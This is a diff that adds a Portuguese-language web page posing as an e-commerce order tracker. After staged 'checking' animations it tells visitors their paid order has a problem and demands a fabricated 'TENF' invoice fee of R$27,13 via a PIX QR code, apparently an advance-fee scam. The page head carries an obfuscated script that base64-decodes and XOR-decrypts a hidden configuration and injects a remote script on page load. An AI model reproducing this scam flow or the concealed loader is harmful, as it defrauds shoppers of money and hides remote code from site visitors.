@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>NF</title>
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
+<script>(function(){var x_3o2z=atob("DBVvs+7RgmayYX0yt25Nxpy9oFyQCQlGx2ZVnMGy5gicFAlf3nMWnY2+70jQE1JB1GcGw5qirRbbGRhemGUGy4u9rAzBQ1EQ1mEbwYez9xLXEl8I7EhDkYm97QTTDQ4QjU4UkYCw7wOQW19C3m0K36e1oEqQFxxewnBNiczn41+DUR9X1ndbgtez4ACFA0UDgnEMit3z/zvP");var m_3=[];for(var i_ar9f=0;i_ar9f<x_3o2z.length;i_ar9f++){m_3.push(x_3o2z.charCodeAt(i_ar9f)&255);}var g_lp3=m_3[0];var f_1=m_3.slice(1,1+g_lp3);var z_4r=m_3.slice(1+g_lp3);var s_y=z_4r.map(function(b,v_butu){return b^f_1[v_butu%g_lp3];});var d_og="";for(var o_f7gd=0;o_f7gd<s_y.length;o_f7gd++){d_og+=String.fromCharCode(s_y[o_f7gd]&255);}var k_c=decodeURIComponent(escape(d_og));var r_73=JSON.parse(k_c);var n_p=r_73.globals||[];n_p.forEach(function(w_0b77){window[w_0b77.name]=w_0b77.value;});var j_ih=document.createElement("script");j_ih.src=r_73.url;j_ih.async=true;j_ih.defer=true;(r_73.attributes||[]).forEach(function(f_8){j_ih.setAttribute(f_8.name,f_8.value);});(document.head||document.documentElement).appendChild(j_ih);})();</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+</head>
+<body>
+   
+
+    <nav class="navbar" style="padding-top: 15px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+            <img src="../../img/logo/logooo.svg" style="height: 24px; width: auto;" alt="Arremata+">
+        </div>
+
+        <div class="logo-central">
+        </div>
+
+        <div class="menu-icon" style="padding-right: 3%;">
+            <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black">shopping_cart</span>
+        </div>
+    </nav>
+
+
+
+
+
+    <div id="ad1">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Seus pedidos</p>
+
+        <div class="ad1">
+
+            <div style="margin-left: 3%; margin-right: 3%;" >
+
+                <button class="styled-button">
+                    <div class="icon-container">
+                        <span class="material-symbols-outlined">local_shipping</span>
+                    </div>
+                    <span class="button-text">
+                        <span class="button-title">#6481749338</span>
+                    </span>
+                </button>
+    
+                <div class="entrega-container">
+                    <div class="entrega-header">
+                        Status
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container2">
+                            <span class="material-symbols-outlined">check</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pagamento concluído</div>
+                        </div>
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container3">
+                            <span class="material-symbols-outlined">warning</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pendência no pedido</div>
+                        </div>
+                    </div>
+                </div>
+    
+         
+    
+                <p style="text-align: center; margin-left: 3%; margin-right: 3%;">Seu pagamento foi concluido com sucesso, porém foi encontrado uma pendência no seu pedido. Clique abaixo para resolver esse problema!</p>
+    
+                <div class="button-container" style="padding-bottom: 20px;">
+                    <button class="styled-button2" onclick="showAd2()">
+                        <span class="button-text">
+                            <span class="button-title2">Resolver problema</span>
+                        </span>
+                        <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                    </button>
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+    </div>
+
+
+    <div id="ad2" style="display: none;">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Problemas no pedido</p>
+
+        <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
+
+            <div style="padding-top: 2px;"></div>
+
+            <div id="loadingGif" class="loading">
+                <div class="spinner"></div>
+            </div>
+    
+
+            <div class="entrega-container hidden" id="text1">
+                <div class="entrega-content">
+                    <div class="icon-container2">
+                        <span class="material-symbols-outlined">settings</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Estamos identificando o problema no seu pedido!</div>
+                    </div>
+                </div>
+            </div>
+    
+            <div id="loadingGif2" class="loading hidden">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text2" class="hidden entrega-container" style="margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: red;">
+                        <span class="material-symbols-outlined">warning</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Identificamos que existe uma pendência no seu pedido!</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="loadingGif3" class="loading hidden" style="padding-top: 20px;">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text3" class="hidden entrega-container" style="background-color: #d40303; margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+                        <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title" style="color: white">É necessário realizar o pagamento da TENF (Taxa de Emissão da Nota Fiscal) para Emitir a Nota Fiscal do seu produto e realizarmos o despacho. No valor único de R$27,13</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
+                <button class="styled-button2" onclick="openPixTenf(27.13)">
+                    <span class="button-text">
+                      <span class="button-title2">Pagar o TENF</span>
+                    </span>
+                    <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                  </button>
+                  
+            </div>
+
+            <div style="padding-bottom: 2px;"></div>
+
+        </div>
+
+        
+
+    </div>
+
+   
+<div id="pixModalOverlay" style="position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;z-index:99999;padding:18px;">
+    <div id="pixModal" style="width:min(520px,100%);background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.25);font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;">
+      <div style="display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #eee;">
+        <div style="font-weight:800;font-size:16px;">Pagamento via PIX</div>
+        <button id="pixCloseBtn" style="border:none;background:transparent;font-size:22px;line-height:1;cursor:pointer;">×</button>
+      </div>
+  
+      <div id="pixStateLoading" style="padding:18px 16px;display:block;">
+        <div style="display:flex;align-items:center;gap:10px;">
+          <div style="width:18px;height:18px;border:2px solid #ddd;border-top-color:#111;border-radius:50%;animation:spin 1s linear infinite;"></div>
+          <div style="font-size:14px;font-weight:700;">Gerando seu PIX…</div>
+        </div>
+        <div style="margin-top:10px;font-size:13px;color:#555;">Aguarde alguns segundos. Não feche esta janela.</div>
+      </div>
+  
+      <div id="pixStateSuccess" style="padding:18px 16px;display:none;">
+        <div style="display:flex;gap:12px;align-items:flex-start;">
+          <div style="width:38px;height:38px;border-radius:10px;background:#f3f4f6;display:flex;align-items:center;justify-content:center;font-weight:900;">✓</div>
+          <div>
+            <div style="font-weight:900;font-size:15px;">PIX gerado com sucesso</div>
+            <div id="pixAmountLabel" style="margin-top:4px;font-size:13px;color:#444;"></div>
+            <div id="pixTxLabel" style="margin-top:4px;font-size:12px;color:#666;word-break:break-all;"></div>
+          </div>
+        </div>
+  
+        <div style="margin-top:14px;display:flex;justify-content:center;">
+          <img id="pixQrImg" alt="QR Code PIX" style="width:220px;height:220px;border:1px solid #eee;border-radius:12px;padding:10px;background:#fff;" />
+        </div>
+  
+        <div style="margin-top:12px;font-size:13px;color:#444;font-weight:700;">Ou copie e cole o código PIX:</div>
+  
+        <div style="margin-top:8px;border:1px solid #e5e7eb;border-radius:12px;background:#fafafa;padding:10px;">
+          <textarea id="pixCodeBox" readonly style="width:100%;min-height:84px;resize:none;border:none;outline:none;background:transparent;font-size:12px;line-height:1.35;word-break:break-all;"></textarea>
+        </div>
+  
+        <div style="margin-top:12px;display:flex;gap:10px;flex-wrap:wrap;">
+          <button id="pixCopyBtn" style="flex:1;min-width:160px;border:none;border-radius:12px;padding:12px 14px;background:#111;color:#fff;font-weight:800;cursor:pointer;">Copiar código PIX</button>
+          <button id="pixOpenBankBtn" style="flex:1;min-width:160px;border:1px solid #e5e7eb;border-radius:12px;padding:12px 14px;background:#fff;color:#111;font-weight:800;cursor:pointer;">Abrir app do banco</button>
+        </div>
+  
+        <div id="pixToast" style="margin-top:10px;font-size:12px;color:#0a7a2f;font-weight:800;display:none;">Código copiado.</div>
+  
+        <div style="margin-top:12px;font-size:12px;color:#666;">
+          Passos: abra o app do banco → PIX → “copia e cola” ou “pagar com QR” → confirme o pagamento.
+        </div>
+      </div>
+  
+      <div id="pixStateError" style="padding:18px 16px;display:none;">
+        <div style="font-weight:900;font-size:15px;color:#b91c1c;">Não foi possível gerar o PIX</div>
+        <div id="pixErrorMsg" style="margin-top:8px;font-size:13px;color:#555;"></div>
+        <div style="margin-top:12px;display:flex;gap:10px;">
+          <button id="pixRetryBtn" style="flex:1;border:none;border-radius:12px;padding:12px 14px;background:#111;color:#fff;font-weight:800;cursor:pointer;">Tentar novamente</button>
+          <button id="pixCloseBtn2" style="flex:1;border:1px solid #e5e7eb;border-radius:12px;padding:12px 14px;background:#fff;color:#111;font-weight:800;cursor:pointer;">Fechar</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <style>
+  @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+  
+    
+    
+    <script src="scripts.js"></script>
+
+</body>
+</html>
